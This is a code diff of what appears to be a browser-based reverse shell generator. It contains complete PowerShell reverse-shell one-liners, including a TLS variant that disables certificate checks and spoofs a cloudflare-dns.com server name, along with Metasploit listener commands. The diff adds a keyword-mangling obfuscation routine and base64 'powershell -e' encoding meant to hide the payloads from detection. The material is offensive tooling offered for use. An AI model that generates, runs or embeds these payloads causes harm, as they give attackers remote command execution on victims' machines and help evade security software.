@@ -4,7 +4,7 @@ const psTwo = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPCl
 
 const psThree = 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient("<host>", <port>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + "SHELL> ");$StreamWriter.Flush()}WriteToStream "";while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"';
 
-const psFourTLS = "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('<host>', <port>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()";
+const psFourTLS = '$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient("<host>", <port>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient("cloudflare-dns.com",$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + "SHELL> ");$StreamWriter.Flush()};WriteToStream "";while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()';
 
 const psRevRaw = [psOne, psTwo, psThree, psFourTLS];
 
@@ -25,6 +25,11 @@ const listenerSeven = 'sudo msfconsole -q -x "use multi/handler; set payload win
 const listenersRaw = [listenerOne, listenerTwo, listenerThree, listenerFour, listenerFive, listenerSix, listenerSeven];
 
 // mangle
+const mangleExprPre = '$mangledStr=\'';
+const mangleExprPost = '\';$staticStrArr="new","net","client","tcp","object","new","mkfifo","socket","tmp","security","ssl","stream","\$","buff","out","system","proto","expre","invoke","flush","auth",".",";";$replaceStrArr="dfi1","wiggleworm","nOt4t0","d00d1eb0p","unpotat","soiledpeanuts","tinylittledragons","thetiniestofhorses","capitalismisascam","bramblebush","ins4ecureSilly","456yt","\@\@\@\^","muscleperverts","inniebellybutton","ponishouldponiponi","ayylemone","testicles","lololol","teppidwater","orderhotwaterataniceresteraunt","deee","onoamouse";$demangledStr=$mangledStr;for($i=0;$i -le $staticStrArr.length;$i++){$demangledStr = $demangledStr -replace $replaceStrArr[$i],$staticStrArr[$i]};invoke-expression $demangledStr&'
+
+// const mangleExprPost = '\';$staticStrArr="new","net","client","tcp","object","new","mkfifo","socket","tmp","security","ssl","stream","\$","buff","out","system","proto","expre","invoke","flush","auth",".",";";$replaceStrArr="dfi1","wiggleworm","nOt4t0","d00d1eb0p","unpotat","soiledpeanuts","tinylittledragons","thetiniestofhorses","capitalismisascam","bramblebush","ins4ecureSilly","456yt","\\@\\@\\@\\^","muscleperverts","inniebellybutton","ponishouldponiponi","ayylemone","testicles","lololol","teppidwater","orderhotwaterataniceresteraunt","deee","onoamouse";$demangledStr=$mangledStr;for($i=0;$i -le $staticStrArr.length;$i++){$demangledStr = $demangledStr -replace $replaceStrArr[$i],$staticStrArr[$i];$staticStrArr[$i];$replaceStrArr[$i]};invoke-expression $demangledStr&'
+
 const replaceStrArr = ['dfi1', 'wiggleworm', 'nOt4t0', 'd00d1eb0p', 'unpotat', 'soiledpeanuts', 'tinylittledragons', 'thetiniestofhorses', 'capitalismisascam','bramblebush', 'ins4ecureSilly', '456yt', '@@@^', 'muscleperverts', 'inniebellybutton', 'ponishouldponiponi', 'ayylemone', 'testicles', 'lololol', 'teppidwater', 'orderhotwaterataniceresteraunt', 'deee', 'onoamouse'];
 
 const findStrArr = [/new/gi, /net/gi, /client/gi, /tcp/gi, /object/gi, /new/gi, /mkfifo/gi, /socket/gi, /tmp/gi, /security/gi, /ssl/gi, /stream/gi, /\$/gi, /buff/gi, /out/gi, /system/gi, /proto/gi, /expre/gi, /invoke/gi, /flush/gi, /auth/gi, /\./gi, /;/gi];
@@ -38,7 +43,8 @@ function mangleRevShell(revShellStr) {
         mangiemut = mangiemut.replaceAll(findStrArr[i], replaceStrArr[i]);
     }
 
-    return mangiemut;
+    const mangleExprExe = mangleExprPre+mangiemut+mangleExprPost;
+    return mangleExprExe;
 }
 
 function demangleRevShell(mangledRevShellStr) {
@@ -49,15 +55,6 @@ function demangleRevShell(mangledRevShellStr) {
 
     return cutedoggy;
 }
-/*
-function revealConfig() {
-    document.getElementById("advancedConfig").style.display = "block";
-}
-
-function showListener() {
-    document.getElementById("listenerDiv").style.display = "block";
-}
-*/
 
 function encodeUTF16LE(str) { // props Keveun https://stackoverflow.com/questions/24379446/utf-8-to-utf-16le-javascript
     var out, i, len, c;
@@ -138,6 +135,12 @@ function configShell(rawShellString, host, port/*, shell*/) {
     return moddedCmdString;
 }
 
+function psEncodeBase64Exe(shellStr) {
+    const psEncodedlUTF16LE = encodeUTF16LE(shellStr);
+    const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
+    return base64EncodedPSExecutable;
+}
+
 function encodePS(rawShellString, listenerShow=true) {
     const host = document.getElementById("host").value;
     const port = document.getElementById("port").value;
@@ -161,16 +164,22 @@ function encodePS(rawShellString, listenerShow=true) {
     }
 
     // for `powershell -e $base64EncodedData` to work, the commands need to be first encoded into Unicode/UTF-16 LE (Windows default) than base64 encoded
-    const psEncodedlUTF16LE = encodeUTF16LE(moddedCmdString);
-    const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
+    // const psEncodedlUTF16LE = encodeUTF16LE(moddedCmdString);
+    // const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
+    const base64EncodedPSExecutable = psEncodeBase64Exe(moddedCmdString);
     const mangledCmd = mangleRevShell(moddedCmdString);
+    const mangEncCmd = psEncodeBase64Exe(mangleRevShell(moddedCmdString).slice(0, -1));
+    console.log(mangleRevShell(moddedCmdString).slice(0, -1));
     const listener = configShell(listenersRaw[rstype], host, port);
-
     document.getElementById("hiddenOutput").innerHTML = base64EncodedPSExecutable;
     document.getElementById("hiddenUnencoded").innerHTML = moddedCmdString;
+    document.getElementById("mangledpayload").innerHTML = mangledCmd;
+    document.getElementById("mangledencodedpayload").innerHTML = mangEncCmd;
     document.getElementById("listener").innerHTML = listener;
     document.getElementById("encodedDiv").style.display = "block";
     document.getElementById("unencodedDiv").style.display = "block";
+    document.getElementById("mangledDiv").style.display = "block";
+    document.getElementById("mangledEncodedDiv").style.display = "block";
     if(listenerShow) {
         document.getElementById("listenerDiv").style.display = "block";
     }
@@ -207,10 +216,3 @@ function swapMode(mode) {
 
     document.getElementById('encodedDiv').style.display = "none"; // output div
 }
-
-/*
-function obsenc(cmd) {
-    const matchies = cmd.match(/\$[a-zA-z0-9-_]{2,30}[\s;\.]/gi);
-    console.log(matchies);
-}
-*/
